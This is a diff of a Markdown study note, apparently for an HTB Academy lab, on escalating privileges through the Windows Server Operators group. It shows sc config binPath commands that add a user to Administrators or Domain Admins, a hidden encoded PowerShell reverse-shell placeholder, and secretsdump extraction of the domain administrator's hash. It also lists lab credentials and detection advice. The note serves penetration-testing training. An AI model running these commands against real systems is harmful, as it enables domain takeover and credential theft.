@@ -1,4 +1,4 @@
-# Server Operators Privilege Escalation
+# 🖥️ Server Operators
 
 ## 🎯 Overview
 
@@ -17,6 +17,7 @@ SERVICE_ALL_ACCESS           # Full control over local services
 ## 🔧 Service Control Exploitation
 
 ### Service Reconnaissance
+
 ```cmd
 # Query service configuration
 sc qc AppReadiness
@@ -30,6 +31,7 @@ SERVICE_START_NAME : LocalSystem
 ```
 
 ### Verify Service Permissions
+
 ```cmd
 # Check service permissions with PsService
 c:\Tools\PsService.exe security AppReadiness
@@ -42,6 +44,7 @@ c:\Tools\PsService.exe security AppReadiness
 ## 🚀 Binary Path Attack
 
 ### Current Admin Group Check
+
 ```cmd
 # Check current administrators group
 net localgroup Administrators
@@ -53,6 +56,7 @@ Enterprise Admins
 ```
 
 ### Modify Service Binary Path
+
 ```cmd
 # Change binary path to add user to local admins
 sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
@@ -62,6 +66,7 @@ sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm
 ```
 
 ### Execute Service (Expected to Fail)
+
 ```cmd
 # Start service to execute command
 sc start AppReadiness
@@ -72,6 +77,7 @@ The service did not respond to the start or control request in a timely fashion.
 ```
 
 ### Verify Privilege Escalation
+
 ```cmd
 # Check administrators group membership
 net localgroup Administrators
@@ -86,12 +92,14 @@ server_adm                    # ← Successfully added
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Credentials**: `server_adm:HTB_@cademy_stdnt!`
-- **Access Method**: RDP
-- **Target Service**: AppReadiness
-- **Flag Location**: `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`
+
+* **Credentials**: `server_adm:HTB_@cademy_stdnt!`
+* **Access Method**: RDP
+* **Target Service**: AppReadiness
+* **Flag Location**: `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`
 
 ### Quick Steps
+
 ```cmd
 # 1. RDP connect and verify current permissions
 net localgroup Administrators
@@ -112,6 +120,7 @@ type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
 ## 🏆 Post-Exploitation Capabilities
 
 ### Domain Controller Access
+
 ```bash
 # Verify Domain Controller access with crackmapexec
 crackmapexec smb TARGET_IP -u server_adm -p 'HTB_@cademy_stdnt!'
@@ -121,6 +130,7 @@ SMB         TARGET_IP     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server
 ```
 
 ### Domain Credential Extraction
+
 ```bash
 # Extract domain credentials using secretsdump.py
 secretsdump.py server_adm@TARGET_IP -just-dc-user administrator
@@ -132,6 +142,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5
 ## 🔄 Alternative Attack Vectors
 
 ### Other Target Services
+
 ```cmd
 # Identify other controllable services
 sc query state= all | findstr "SERVICE_NAME"
@@ -144,6 +155,7 @@ sc query state= all | findstr "SERVICE_NAME"
 ```
 
 ### Alternative Payloads
+
 ```cmd
 # Reverse shell payload
 sc config SERVICE binPath= "cmd /c powershell -nop -w hidden -e BASE64_PAYLOAD"
@@ -155,6 +167,7 @@ sc config SERVICE binPath= "cmd /c net group 'Domain Admins' server_adm /add /do
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Service configuration changes (Event ID 7040)
@@ -164,6 +177,7 @@ sc config SERVICE binPath= "cmd /c net group 'Domain Admins' server_adm /add /do
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Mitigation strategies:
 - Limit Server Operators group membership
@@ -174,12 +188,12 @@ sc config SERVICE binPath= "cmd /c net group 'Domain Admins' server_adm /add /do
 
 ## 💡 Key Takeaways
 
-1. **Server Operators** group provides **SERVICE_ALL_ACCESS** over local services
+1. **Server Operators** group provides **SERVICE\_ALL\_ACCESS** over local services
 2. **Binary path modification** enables command execution as **SYSTEM**
 3. **Local administrator access** leads to **Domain Controller compromise**
 4. **SeBackupPrivilege** provides additional attack vectors
 5. **High-impact group** requiring careful access control
 
----
+***
 
-*Server Operators group exploitation leverages service control capabilities for immediate local administrator access and potential domain compromise.* 
+_Server Operators group exploitation leverages service control capabilities for immediate local administrator access and potential domain compromise._
